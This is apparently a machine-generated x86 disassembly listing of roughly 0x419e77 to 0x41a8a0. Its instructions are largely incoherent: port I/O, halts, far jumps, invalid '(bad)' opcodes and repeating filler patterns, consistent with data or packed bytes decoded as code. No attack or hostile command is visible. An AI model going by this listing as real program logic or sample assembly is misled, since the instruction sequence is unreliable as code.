  419e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e78:	fst    st(5)
  419e7a:	jmp    0x2458:0xa94f7d9b
  419e81:	cmc    
  419e82:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  419e84:	out    dx,al
  419e85:	inc    ebp
  419e86:	cmc    
  419e87:	inc    eax
  419e88:	mov    ds:0x712e794c,eax
  419e8d:	or     BYTE PTR [ebp+0x5ca92454],0xf8
  419e94:	les    ecx,FWORD PTR [edi]
  419e96:	hlt    
  419e97:	push   eax
  419e98:	pop    edi
  419e99:	and    ebp,DWORD PTR [eax+0x3d1d0314]
  419e9f:	test   BYTE PTR [eax-0x4e],bh
  419ea2:	fmul   QWORD PTR [esi+0x47]
  419ea5:	inc    edx
  419ea6:	jb     0x419efd
  419ea8:	jae    0x419f28
  419eaa:	push   es
  419eab:	ss or  eax,0x7d9470fa
  419eb1:	sub    DWORD PTR [ebx+eiz*2],0xd
  419eb5:	jne    0x419e88
  419eb7:	mul    bl
  419eb9:	pop    ds
  419eba:	in     al,dx
  419ebb:	xchg   esp,eax
  419ebc:	inc    esi
  419ebd:	pop    ebp
  419ebe:	jge    0x419e5e
  419ec0:	pop    esp
  419ec1:	xchg   ebx,eax
	...
  419f32:	add    BYTE PTR [eax],al
  419f34:	sbb    al,0x97
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx+0x189e0b49]
  419f41:	or     BYTE PTR [ebx],ch
  419f43:	test   DWORD PTR [eax+0x19],esi
  419f46:	add    DWORD PTR [eax],eax
  419f48:	test   BYTE PTR [eax],0x0
  419f4b:	add    BYTE PTR [ebp+0x65e1baab],dh
  419f51:	arpl   WORD PTR [ecx-0x7aeda953],dx
  419f57:	cli    
  419f58:	ja     0x419fa1
  419f5a:	popf   
  419f5b:	lods   eax,DWORD PTR ds:[esi]
  419f5c:	or     al,0x7d
  419f5e:	add    al,0xef
  419f60:	imul   DWORD PTR [esi+0x56d56c02]
  419f66:	lahf   
  419f67:	adc    al,0x32
  419f69:	sar    ebp,0x90
  419f6c:	loop   0x419f3b
  419f6e:	adc    DWORD PTR [esp+ebp*8+0x62],esp
  419f72:	cs ffree st(3)
  419f75:	adc    DWORD PTR [ebp+0x78],esp
  419f78:	inc    ecx
  419f79:	mov    ds,WORD PTR [ebp-0x3aaca16b]
  419f7f:	adc    edi,DWORD PTR [eax-0x478749c]
  419f85:	or     BYTE PTR [edx-0x2551b4db],ch
  419f8b:	ins    BYTE PTR es:[edi],dx
  419f8c:	sahf   
  419f8d:	xchg   al,ah
  419f8f:	mov    al,dl
  419f91:	xchg   ebp,eax
  419f92:	lods   eax,DWORD PTR ds:[esi]
  419f93:	push   0xdb16e3da
  419f98:	or     DWORD PTR [edi+ebp*2-0x1da42577],edx
  419f9f:	pushf  
  419fa0:	data16 and ch,BYTE PTR gs:[edi+0x17caa173]
  419fa8:	daa    
  419fa9:	sub    DWORD PTR [edx],esp
  419fab:	pop    edi
  419fac:	jp     0x419f97
  419fae:	mov    ch,0x96
  419fb0:	inc    ebp
  419fb1:	xchg   esp,eax
  419fb2:	fld    TBYTE PTR [edi]
  419fb4:	aad    0x6
  419fb6:	mov    ecx,DWORD PTR [esi+edx*1+0x55]
  419fba:	mov    cl,0x96
  419fbc:	ret    0xae3
  419fbf:	inc    esp
  419fc0:	mov    ebx,0x44fb1b5c
  419fc5:	jmp    0x419fab
  419fc7:	inc    eax
  419fc8:	cmp    al,0xf1
  419fca:	mov    esi,0x4cd2ae79
  419fcf:	jp     0x419fa8
  419fd1:	mov    esi,0xa28a81de
  419fd6:	(bad)  
  419fd7:	mov    cl,0xa6
  419fd9:	xor    dh,BYTE PTR [edx-0x6f]
  419fdc:	push   ebx
  419fdd:	add    eax,0x53c25feb
  419fe2:	sti    
  419fe3:	sub    ecx,DWORD PTR [ebp+ebx*2-0x71]
  419fe7:	mov    cl,0xd2
  419fe9:	or     eax,0x3910ec2a
  419fee:	add    esi,DWORD PTR [edx]
  419ff0:	and    BYTE PTR [ecx-0x65],al
  419ff3:	and    bh,BYTE PTR es:[esi+0x605c201d]
  419ffa:	cmp    esi,DWORD PTR [eax]
  419ffc:	rcl    DWORD PTR [edx+eax*2],1
  419fff:	jge    0x419ff1
  41a001:	retf   
  41a002:	int3   
  41a003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a004:	mov    edx,DWORD PTR [ebx-0x38]
  41a007:	jg     0x419f9a
  41a009:	ins    BYTE PTR es:[edi],dx
  41a00a:	into   
  41a00b:	popf   
  41a00c:	dec    edi
  41a00d:	dec    ecx
  41a00e:	mov    ah,0x28
  41a010:	mov    esp,0xa4ed1f7f
  41a015:	icebp  
  41a016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a017:	(bad)  
  41a019:	mov    eax,ds:0xbf68d8b5
  41a01e:	pusha  
  41a01f:	test   eax,0xf6fef0ed
  41a024:	mov    DWORD PTR [ebx],0xc7815f0b
  41a02a:	xor    edx,DWORD PTR [esi-0x51]
  41a02d:	cmp    eax,0xa5eb3572
  41a032:	das    
  41a033:	jns    0x419fba
  41a035:	sbb    ebp,DWORD PTR [eax-0x37]
  41a038:	popf   
  41a039:	jmp    0x1b95e7ab
  41a03e:	adc    al,0xa9
  41a040:	mov    ecx,0xf1
	...
  41a0b1:	add    BYTE PTR [eax],al
  41a0b3:	add    BYTE PTR [edi-0x41bd617b],ch
  41a0b9:	pop    ebx
  41a0ba:	(bad)  
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0x372704a2
  41a0c2:	push   ebp
  41a0c3:	fisub  DWORD PTR [esi+0x1a]
  41a0c6:	add    DWORD PTR [eax],eax
  41a0c8:	test   BYTE PTR [eax],0x0
  41a0cb:	add    al,bh
  41a0cd:	imul   al
  41a0cf:	push   esp
  41a0d0:	pop    ebp
  41a0d1:	mov    ds:0x29bc9c43,al
  41a0d6:	add    eax,0x8be12bf5
  41a0db:	(bad)  
  41a0dc:	jae    0x41a0bb
  41a0de:	jecxz  0x41a095
  41a0e0:	adc    al,ch
  41a0e2:	imul   ecx,ebx,0x55
  41a0e5:	mov    esp,DWORD PTR [ebx+0x5]
  41a0e8:	out    0xa4,eax
  41a0ea:	sbb    bh,BYTE PTR [ecx]
  41a0ec:	adc    edx,DWORD PTR [ebx-0x75]
  41a0ef:	sbb    al,BYTE PTR [eax]
  41a0f1:	aad    0xd2
  41a0f3:	out    0x2,eax
  41a0f5:	and    eax,0x682884b6
  41a0fa:	jge    0x41a163
  41a0fc:	shl    DWORD PTR [edi+ebp*4-0x3ec3e769],cl
  41a103:	mov    bh,0xa
  41a105:	es xchg edi,eax
  41a107:	mov    ah,0xf3
  41a109:	jle    0x41a165
  41a10b:	adc    eax,0xad9f954d
  41a110:	out    0x85,eax
  41a112:	in     al,dx
  41a113:	xchg   ebx,eax
  41a114:	dec    ebp
  41a115:	test   BYTE PTR [edx],dh
  41a117:	push   esi
  41a118:	inc    esi
  41a119:	outs   dx,DWORD PTR ds:[esi]
  41a11a:	mov    ds:0x417c0900,eax
  41a11f:	aaa    
  41a120:	jecxz  0x41a184
  41a122:	push   esi
  41a123:	jmp    0x9f48:0x72361e28
  41a12a:	adc    al,0x43
  41a12c:	adc    BYTE PTR [edi-0x36],0x25
  41a130:	test   edx,esi
  41a132:	in     eax,dx
  41a133:	inc    esi
  41a134:	inc    ebx
  41a135:	push   ebp
  41a136:	xor    cl,BYTE PTR [edx+ebp*8+0x44d18e60]
  41a13d:	sbb    al,0xf8
  41a13f:	add    eax,0x6e8cb80f
  41a144:	icebp  
  41a145:	ds push ds
  41a147:	mov    eax,0x7b732f48
  41a14c:	xor    esi,esp
  41a14e:	mul    BYTE PTR [edx-0xd]
  41a151:	or     BYTE PTR [ebx+0x4],dl
  41a154:	xor    DWORD PTR [ebp-0x73ff2a6f],0xffffffc2
  41a15b:	scas   al,BYTE PTR es:[edi]
  41a15c:	mov    eax,ds:0xf504b969
  41a161:	das    
  41a162:	idiv   cl
  41a164:	jle    0x41a148
  41a166:	add    DWORD PTR [ebx+0x64],esi
  41a169:	sahf   
  41a16a:	jp     0x41a154
  41a16c:	sahf   
  41a16d:	(bad)  
  41a16e:	out    dx,al
  41a16f:	dec    edx
  41a170:	mov    ds,WORD PTR [ecx]
  41a172:	outs   dx,WORD PTR ds:[esi]
  41a174:	push   edi
  41a175:	loope  0x41a119
  41a177:	push   ss
  41a178:	inc    esi
  41a179:	push   ebx
  41a17a:	cwde   
  41a17b:	push   eax
  41a17c:	and    ebp,ebx
  41a17e:	sub    al,0xdc
  41a180:	cld    
  41a181:	adc    DWORD PTR [edx+0x773b98cd],eax
  41a187:	dec    esi
  41a188:	sbb    dh,bl
  41a18a:	xor    eax,0x44f2b0f
  41a18f:	mov    cl,0x4b
  41a191:	adc    ah,ch
  41a193:	cmc    
  41a194:	xchg   edi,eax
  41a195:	sub    DWORD PTR [ebp-0x6a1ed594],0xa1550fd3
  41a19f:	ja     0x41a1c9
  41a1a1:	xor    ecx,ebx
  41a1a3:	and    esp,DWORD PTR [ebp+0x1]
  41a1a6:	cmp    esp,0xd9b06b8b
  41a1ac:	push   ebp
  41a1ad:	hlt    
  41a1ae:	(bad)  
  41a1af:	(bad)  
  41a1b0:	push   ds
  41a1b1:	pop    ecx
  41a1b2:	loopne 0x41a230
  41a1b4:	out    dx,eax
  41a1b5:	adc    BYTE PTR ds:0x25ed1d92,dh
  41a1bb:	hlt    
  41a1bc:	push   0xffffffe3
  41a1be:	retf   
  41a1bf:	cdq    
  41a1c0:	ret    0x10
	...
  41a233:	add    BYTE PTR [eax-0xcc4519],ah
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	idiv   BYTE PTR [ecx+0x26]
  41a242:	pop    esp
  41a243:	xchg   ebp,eax
  41a244:	pop    esp
  41a245:	sbb    eax,DWORD PTR [ecx]
  41a247:	add    dh,dh
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    BYTE PTR [esp+ebp*1],al
  41a24e:	pop    ebx
  41a24f:	jnp    0x41a1db
  41a251:	in     al,dx
  41a252:	test   BYTE PTR [ebx],bl
  41a254:	push   esp
  41a255:	pop    ebp
  41a256:	cld    
  41a257:	adc    dh,al
  41a259:	js     0x41a20f
  41a25b:	and    DWORD PTR [eax],edi
  41a25d:	loopne 0x41a244
  41a25f:	ins    BYTE PTR es:[edi],dx
  41a260:	sbb    BYTE PTR [edx],dh
  41a262:	daa    
  41a263:	sub    DWORD PTR [eax-0x72],eax
  41a266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a267:	push   0xffffffc4
  41a269:	in     eax,0xbb
  41a26b:	shl    BYTE PTR ds:0x89fc24e7,0xa1
  41a272:	rcr    DWORD PTR [edx+0x6e790179],cl
  41a278:	pop    esp
  41a279:	xchg   ebx,eax
  41a27a:	mov    al,ds:0xfe7071a1
  41a27f:	inc    edi
  41a280:	mov    bh,0x41
  41a282:	aaa    
  41a283:	sbb    dh,BYTE PTR [esi-0x16]
  41a286:	test   DWORD PTR ds:0xf2842532,ecx
  41a28c:	and    eax,0xffffff98
  41a28f:	mul    edx
  41a291:	push   ecx
  41a292:	icebp  
  41a293:	dec    esi
  41a294:	and    eax,0x291de62b
  41a299:	xor    ebp,esp
  41a29b:	xchg   edx,eax
  41a29c:	ss add ebp,ebx
  41a29f:	mov    ch,BYTE PTR ds:0x17bee87
  41a2a5:	(bad)  
  41a2a6:	loopne 0x41a321
  41a2a8:	mov    eax,0xc1d9c9ca
  41a2ad:	fild   QWORD PTR [edx]
  41a2af:	mov    esi,DWORD PTR [edi-0x5f]
  41a2b2:	jmp    0x41a2d5
  41a2b4:	add    al,0xd7
  41a2b6:	clc    
  41a2b7:	push   cs
  41a2b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2b9:	add    BYTE PTR [ebx-0xaa4eaaa],ah
  41a2bf:	and    ebp,DWORD PTR [edx-0x49]
  41a2c2:	out    dx,al
  41a2c3:	add    DWORD PTR [esi+0x2a],edi
  41a2c6:	(bad)  
  41a2c7:	cs cmc 
  41a2c9:	inc    ebp
  41a2ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2cc:	mov    esi,0x8e12dff0
  41a2d1:	push   edi
  41a2d2:	(bad)  
  41a2d3:	(bad)  
  41a2d4:	cmp    DWORD PTR [edx+0x16],ebp
  41a2d7:	jl     0x41a2b6
  41a2d9:	or     cl,BYTE PTR [edx]
  41a2db:	sbb    edx,edx
  41a2dd:	ret    
  41a2de:	cld    
  41a2df:	and    DWORD PTR [eax],edi
  41a2e1:	cmc    
  41a2e2:	xor    DWORD PTR [edi+0x2f],0xed8aebea
  41a2e9:	inc    edx
  41a2ea:	in     al,dx
  41a2eb:	mov    cl,0x50
  41a2ed:	pop    esi
  41a2ee:	dec    edx
  41a2ef:	es add ebx,esi
  41a2f2:	or     eax,0x69038867
  41a2f7:	popa   
  41a2f8:	hlt    
  41a2f9:	mov    al,0x89
  41a2fb:	in     eax,dx
  41a2fc:	xchg   ebx,eax
  41a2fd:	mov    gs,WORD PTR [ebx+0x35137ed9]
  41a303:	fcom   DWORD PTR [edx+eiz*1+0xe4f9ce4]
  41a30a:	dec    esi
  41a30b:	rol    BYTE PTR [eax+ecx*8],1
  41a30e:	sub    al,0xc9
  41a310:	fstp   TBYTE PTR [edx]
  41a312:	fadd   DWORD PTR ds:0x6f67b609
  41a318:	leave  
  41a319:	mov    al,0xd4
  41a31b:	mov    ebp,esi
  41a31d:	inc    esp
  41a31e:	push   es
  41a31f:	cwde   
  41a320:	inc    esi
  41a321:	jmp    0x6d94791e
  41a326:	sbb    cl,ah
  41a328:	push   ebp
  41a329:	ds xchg ecx,eax
  41a32b:	(bad)  
  41a32c:	add    BYTE PTR [ebp-0xdc17164],ch
  41a332:	inc    esi
  41a333:	jns    0x41a3ad
  41a335:	add    BYTE PTR [esi+0x3a24e90],bh
  41a33b:	and    ecx,esi
  41a33d:	lds    ebp,FWORD PTR [edi+eiz*4+0x84b0]
	...
  41a3b4:	cmp    eax,0xed3a6998
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	retf   
  41a3c1:	stos   BYTE PTR es:[edi],al
  41a3c2:	pop    eax
  41a3c3:	fcom   QWORD PTR [edx+0x1c]
  41a3c6:	add    DWORD PTR [eax],eax
  41a3c8:	test   BYTE PTR [eax],0x0
  41a3cb:	add    al,ah
  41a3cd:	enter  0xee8c,0x35
  41a3d1:	out    0xff,al
  41a3d3:	mov    bl,0x47
  41a3d5:	add    DWORD PTR [ebx],esi
  41a3d7:	dec    ebx
  41a3d8:	or     BYTE PTR [esi-0x10],ah
  41a3db:	adc    esi,ebx
  41a3dd:	mov    cl,0x6d
  41a3df:	pop    ebp
  41a3e0:	mov    ah,0x4d
  41a3e2:	jl     0x41a3fb
  41a3e4:	scas   eax,DWORD PTR es:[edi]
  41a3e5:	and    esi,DWORD PTR [eax-0x3e2e806f]
  41a3eb:	mov    dh,0x2e
  41a3ed:	jmp    0xd5f136f6
  41a3f2:	xor    dh,BYTE PTR [edx-0x42]
  41a3f5:	mov    ah,0x54
  41a3f7:	dec    esi
  41a3f8:	mov    bl,0xf1
  41a3fa:	(bad)  
  41a3fb:	sar    ecx,1
  41a3fd:	xlat   BYTE PTR ds:[ebx]
  41a3fe:	(bad)  
  41a3ff:	jb     0x41a471
  41a401:	ret    
  41a402:	or     BYTE PTR ds:0xc3fb8183,ch
  41a408:	dec    esp
  41a409:	mov    ah,BYTE PTR [ecx+0x52]
  41a40c:	and    eax,0xe495e8a0
  41a411:	test   al,0x11
  41a413:	pop    edx
  41a414:	push   esi
  41a415:	ret    
  41a416:	inc    ebp
  41a417:	and    bl,BYTE PTR [edi-0xb]
  41a41a:	std    
  41a41b:	xchg   ebx,eax
  41a41c:	fst    QWORD PTR [ebp-0x22]
  41a41f:	jbe    0x41a3eb
  41a421:	stc    
  41a422:	push   esp
  41a423:	lahf   
  41a424:	mov    al,ds:0xf29f76d4
  41a429:	test   BYTE PTR [esi+0x7d],bh
  41a42c:	fstp   TBYTE PTR [eax-0x54]
  41a42f:	push   ds
  41a430:	rcr    DWORD PTR ds:0x46cd62ab,0xf2
  41a437:	dec    ebp
  41a438:	sahf   
  41a439:	mov    ebp,DWORD PTR [ebx+esi*1-0x23bbf534]
  41a440:	stos   BYTE PTR es:[edi],al
  41a441:	jno    0x41a4a2
  41a443:	sbb    eax,0xc5e08314
  41a448:	dec    ebx
  41a449:	ficomp WORD PTR [edx+0x50]
  41a44c:	outs   dx,DWORD PTR ds:[esi]
  41a44d:	cmp    edx,edx
  41a44f:	sub    BYTE PTR [ebx+ecx*2+0x5c],ch
  41a453:	sub    eax,0x3f9f4b36
  41a458:	popa   
  41a459:	call   0x3436f3c1
  41a45e:	sub    eax,0x7eabab56
  41a463:	push   ecx
  41a464:	xchg   esp,eax
  41a465:	(bad)  
  41a466:	jl     0x41a44e
  41a468:	popf   
  41a469:	fs clc 
  41a46b:	test   eax,0xa8eafee1
  41a470:	or     eax,0x10730dd8
  41a475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a476:	gs retf 0x5f48
  41a47a:	cmp    BYTE PTR [edx],dh
  41a47c:	sub    eax,0x77f18309
  41a481:	lods   eax,DWORD PTR ds:[esi]
  41a482:	mov    bl,0x66
  41a484:	fisttp QWORD PTR [ebx-0x75f9ba01]
  41a48a:	ds sub eax,0x12890ba5
  41a490:	mov    dl,0x8a
  41a492:	push   edx
  41a493:	sahf   
  41a494:	mov    ah,BYTE PTR ds:[edx-0x72]
  41a498:	ins    DWORD PTR es:[edi],dx
  41a499:	in     eax,0xb3
  41a49b:	(bad)  
  41a49c:	ret    
  41a49d:	jb     0x41a460
  41a49f:	jecxz  0x41a4f4
  41a4a1:	inc    esi
  41a4a2:	adc    DWORD PTR [esp+esi*8+0x3a],esi
  41a4a6:	vaddsubpd ymm6,ymm3,YMMWORD PTR [ebp-0x6]
  41a4ab:	jns    0xf3e5cb2e
  41a4b1:	xor    al,0x2f
  41a4b3:	das    
  41a4b4:	inc    ebp
  41a4b5:	popa   
  41a4b6:	sahf   
  41a4b7:	adc    al,BYTE PTR [ebx-0x50b2e4ec]
  41a4bd:	mov    WORD PTR [ebx+0xcbe210],cs
	...
  41a533:	add    BYTE PTR [edi-0x9d722c],ch
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax+0x4ce9e0aa]
  41a541:	add    DWORD PTR [esi+0x11d480f],eax
  41a547:	add    dh,dh
  41a549:	add    BYTE PTR [eax],al
  41a54b:	add    BYTE PTR [edx+0x644a2a0c],ah
  41a551:	jge    0x41a4e6
  41a553:	daa    
  41a554:	test   eax,edi
  41a556:	fs or  al,0x25
  41a559:	pop    esp
  41a55a:	add    edi,DWORD PTR [esi-0x2ca8316e]
  41a560:	retf   
  41a561:	jecxz  0x41a5b0
  41a563:	sub    DWORD PTR [esi-0x74],edi
  41a566:	cmp    cl,dl
  41a568:	cmp    dh,al
  41a56a:	xor    eax,0x21d1e08c
  41a56f:	sub    eax,DWORD PTR [edx+edi*1]
  41a572:	iret   
  41a573:	xchg   edx,eax
  41a574:	nop
  41a575:	sub    edi,DWORD PTR [esi-0x67]
  41a578:	push   ecx
  41a579:	les    edi,FWORD PTR [edi+0x4]
  41a57c:	sub    al,0xc7
  41a57e:	stos   BYTE PTR es:[edi],al
  41a57f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a580:	in     eax,dx
  41a581:	sbb    BYTE PTR [ecx+0x17],bl
  41a584:	aad    0x13
  41a586:	mov    fs,WORD PTR [eax-0x6306211a]
  41a58c:	cld    
  41a58d:	das    
  41a58e:	push   es
  41a58f:	push   es
  41a590:	pop    ds
  41a591:	inc    ecx
  41a592:	sub    ebp,DWORD PTR [edi-0x2945b3f7]
  41a598:	cmp    ebp,esp
  41a59a:	out    dx,eax
  41a59b:	sbb    BYTE PTR [esi-0x2e49d821],cl
  41a5a1:	inc    DWORD PTR [ecx+esi*8+0x6c]
  41a5a5:	imul   ebx,DWORD PTR ss:[ecx-0x1537bc10],0xffffffe1
  41a5ad:	mov    ebx,0xe3bfdaec
  41a5b2:	add    BYTE PTR [ecx+0x16],dh
  41a5b5:	xchg   esp,eax
  41a5b6:	out    dx,eax
  41a5b7:	dec    ecx
  41a5b8:	dec    DWORD PTR [edx]
  41a5ba:	inc    ecx
  41a5bb:	sbb    DWORD PTR [ebx-0x1d4d76a7],edx
  41a5c1:	xor    BYTE PTR [ecx],ah
  41a5c3:	jecxz  0x41a63e
  41a5c5:	ret    
  41a5c6:	jb     0x41a602
  41a5c8:	out    dx,eax
  41a5c9:	or     edi,ecx
  41a5cb:	sbb    esi,DWORD PTR [ebp+ebx*2-0x43614d10]
  41a5d2:	push   es
  41a5d3:	les    ebp,FWORD PTR [ecx-0xe78e36a]
  41a5d9:	loop   0x41a5b5
  41a5db:	rcl    eax,cl
  41a5dd:	push   eax
  41a5de:	push   0x3d
  41a5e0:	fucomp st(0)
  41a5e2:	add    BYTE PTR [edi],0x36
  41a5e5:	stc    
  41a5e6:	aam    0xd9
  41a5e8:	outs   dx,BYTE PTR ds:[esi]
  41a5e9:	dec    ebp
  41a5ea:	add    DWORD PTR [edx],ebx
  41a5ec:	mov    DWORD PTR [ebx-0x17],esp
  41a5ef:	cmp    BYTE PTR [esi+ecx*2-0x42],al
  41a5f3:	xor    ecx,DWORD PTR [edx+0x45cef134]
  41a5f9:	pop    ebx
  41a5fa:	test   BYTE PTR [ebp+0x44ec913c],ah
  41a600:	icebp  
  41a601:	xor    cl,ah
  41a603:	dec    esi
  41a604:	jb     0x41a5db
  41a606:	les    ecx,FWORD PTR [ebp-0x260fff60]
  41a60c:	arpl   WORD PTR [eax],cx
  41a60e:	sub    al,0x7d
  41a610:	shl    bh,cl
  41a612:	xchg   ebp,eax
  41a613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a614:	and    dh,BYTE PTR [eax+0x32]
  41a617:	imul   dh
  41a619:	retf   
  41a61a:	ins    DWORD PTR es:[edi],dx
  41a61b:	out    dx,eax
  41a61c:	mov    esp,0x3d3a2148
  41a621:	stos   BYTE PTR es:[edi],al
  41a622:	out    dx,al
  41a623:	xlat   BYTE PTR ds:[ebx]
  41a624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a625:	pop    ds
  41a626:	jmp    0x41a664
  41a628:	outs   dx,DWORD PTR ds:[esi]
  41a629:	sti    
  41a62a:	out    0x26,eax
  41a62c:	in     eax,0x8c
  41a62e:	mov    es,WORD PTR [ecx+0x49]
  41a631:	mov    ch,0xcb
  41a633:	int    0xf0
  41a635:	cmp    BYTE PTR [ecx-0x211f4908],ch
  41a63b:	and    eax,0x8e875c87
  41a640:	stos   DWORD PTR es:[edi],eax
  41a641:	cwde   
	...
  41a6b2:	add    BYTE PTR [eax],al
  41a6b4:	mov    bl,0x3f
  41a6b6:	jno    0x41a71d
  41a6b8:	std    
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0xbc
  41a6c1:	(bad)  
  41a6c2:	pop    esi
  41a6c3:	dec    esi
  41a6c4:	ds push ds
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	test   BYTE PTR [eax],0x0
  41a6cb:	add    BYTE PTR [edi-0x2c7d5c1b],al
  41a6d1:	(bad)  
  41a6d2:	push   ss
  41a6d3:	dec    esp
  41a6d4:	in     eax,dx
  41a6d5:	pushf  
  41a6d6:	loop   0x41a746
  41a6d8:	(bad)  
  41a6d9:	mov    cl,0x1a
  41a6db:	div    BYTE PTR [edx]
  41a6dd:	xchg   edi,eax
  41a6de:	(bad)  
  41a6e0:	sub    BYTE PTR [esi],ah
  41a6e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6e3:	(bad)  
  41a6e4:	loopne 0x41a6e6
  41a6e6:	push   ss
  41a6e7:	shl    DWORD PTR [ebx+0x49],1
  41a6ea:	mov    esp,0xfda9e6a5
  41a6ef:	in     al,0xf1
  41a6f1:	inc    esp
  41a6f2:	add    DWORD PTR [edx-0x64],0x44
  41a6f6:	add    al,0xa1
  41a6f8:	and    ah,BYTE PTR [eax-0xe]
  41a6fb:	mov    WORD PTR [edx],cs
  41a6fd:	popf   
  41a6fe:	retf   
  41a6ff:	cli    
  41a700:	push   cs
  41a701:	out    0x53,eax
  41a703:	in     eax,dx
  41a704:	adc    BYTE PTR [edx-0x67],dh
  41a707:	int    0x89
  41a709:	pop    edi
  41a70a:	jg     0x41a770
  41a70c:	sbb    ch,ah
  41a70e:	rol    al,1
  41a710:	test   dl,dl
  41a712:	add    al,0x3f
  41a714:	jno    0x41a794
  41a716:	outs   dx,BYTE PTR ds:[esi]
  41a717:	sub    ebp,DWORD PTR [ebp+0x2e034e9e]
  41a71d:	fcmove st,st(2)
  41a71f:	test   BYTE PTR [eax-0x77],ah
  41a722:	clc    
  41a723:	ret    
  41a724:	jne    0x41a70b
  41a726:	push   esp
  41a727:	data16 aas 
  41a729:	test   DWORD PTR [ecx],esp
  41a72b:	pop    es
  41a72c:	cld    
  41a72d:	cwde   
  41a72e:	rcl    ah,0x63
  41a731:	xchg   ecx,eax
  41a732:	aaa    
  41a733:	bound  edi,QWORD PTR [ebx+esi*4+0x71c2b219]
  41a73a:	add    DWORD PTR [edi-0x20],ebx
  41a73d:	xor    al,0x57
  41a73f:	(bad)  
  41a740:	pop    ds
  41a741:	sbb    esp,ebp
  41a743:	stos   DWORD PTR es:[edi],eax
  41a744:	add    al,0xbf
  41a746:	sahf   
  41a747:	add    dh,BYTE PTR [ebp+0x18]
  41a74a:	cmp    al,0x40
  41a74c:	sub    esp,edx
  41a74e:	pop    esp
  41a74f:	loop   0x41a713
  41a751:	loope  0x41a783
  41a753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a754:	loop   0x41a7ae
  41a756:	or     eax,0x607eaf30
  41a75b:	cmp    edx,DWORD PTR [ecx-0x2d937614]
  41a761:	mov    dh,0xd7
  41a763:	(bad)  [ecx]
  41a765:	stc    
  41a766:	inc    ebx
  41a767:	pushf  
  41a768:	sahf   
  41a769:	popa   
  41a76a:	icebp  
  41a76b:	fsubp  st(0),st
  41a76d:	pushf  
  41a76e:	mov    BYTE PTR [ebx-0x54],bh
  41a771:	sub    al,0xd5
  41a773:	jb     0x41a74d
  41a775:	and    al,0x57
  41a777:	leave  
  41a778:	ret    0x65a4
  41a77b:	adc    DWORD PTR [esi+esi*4-0x66fae9d7],0x47
  41a783:	mov    gs,WORD PTR [ebx+edx*8-0x48d86952]
  41a78a:	xchg   esp,eax
  41a78b:	mov    eax,0x9bd763c1
  41a790:	mov    edx,0xce44cebc
  41a795:	xchg   esp,eax
  41a796:	imul   esi,DWORD PTR [edi+0x19217fd],0xfcdf800f
  41a7a0:	out    0x3,eax
  41a7a2:	mov    ebp,0xc561d546
  41a7a7:	pop    es
  41a7a8:	cdq    
  41a7a9:	rcl    esp,0xe0
  41a7ac:	and    al,BYTE PTR [esp+eax*2-0x71430dbd]
  41a7b3:	daa    
  41a7b4:	test   BYTE PTR [ecx+0x73d6c874],dl
  41a7ba:	adc    BYTE PTR [esi],ch
  41a7bc:	mov    ebx,DWORD PTR [ebx+edx*1]
  41a7bf:	mov    dl,0x3b
  41a7c1:	outs   dx,BYTE PTR ds:[esi]
	...
  41a832:	add    BYTE PTR [eax],al
  41a834:	sbb    BYTE PTR [ecx],0x47
  41a837:	loope  0x41a818
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a889
  41a841:	outs   dx,BYTE PTR ds:[esi]
  41a842:	sub    BYTE PTR [edi+0x34],bh
  41a845:	pop    ds
  41a846:	add    DWORD PTR [eax],eax
  41a848:	test   BYTE PTR [eax],0x0
  41a84b:	add    BYTE PTR [eax-0x32c9244f],dh
  41a851:	pop    esi
  41a852:	mov    ecx,0x4eb29bb3
  41a857:	or     BYTE PTR [esi],ch
  41a859:	nop
  41a85a:	pop    ebx
  41a85b:	pop    edi
  41a85c:	hlt    
  41a85d:	add    esi,eax
  41a85f:	cdq    
  41a860:	fwait
  41a861:	seto   BYTE PTR [edx+edi*8+0x48]
  41a866:	or     edi,DWORD PTR [ecx-0x5f2aba98]
  41a86c:	cs push esi
  41a86e:	sti    
  41a86f:	daa    
  41a870:	jnp    0x41a89f
  41a872:	cmp    al,bh
  41a874:	and    edi,DWORD PTR [ecx-0x66]
  41a877:	aas    
  41a878:	lods   al,BYTE PTR ds:[esi]
  41a879:	mov    dh,0x19
  41a87b:	loop   0x41a8b8
  41a87d:	fucom  st(6)
  41a87f:	cmp    edi,DWORD PTR [ebx]
  41a881:	jmp    0x3936a9ff
  41a886:	and    al,0x86
  41a888:	cdq    
  41a889:	pop    edx
  41a88a:	(bad)  
  41a88c:	retf   
  41a88d:	adc    al,BYTE PTR [eax]
  41a88f:	rol    BYTE PTR [edx],cl
  41a891:	pop    edx
  41a892:	js     0x41a87d
  41a894:	push   ebx
  41a895:	mov    bl,0x9e
  41a897:	pop    ss
  41a898:	pop    ds
  41a899:	mov    bh,0x57
  41a89b:	mov    ah,0x1e
  41a89d:	(bad)  
  41a89e:	fsubr  st(0),st
  41a8a0:	add    eax,0x3acfd862
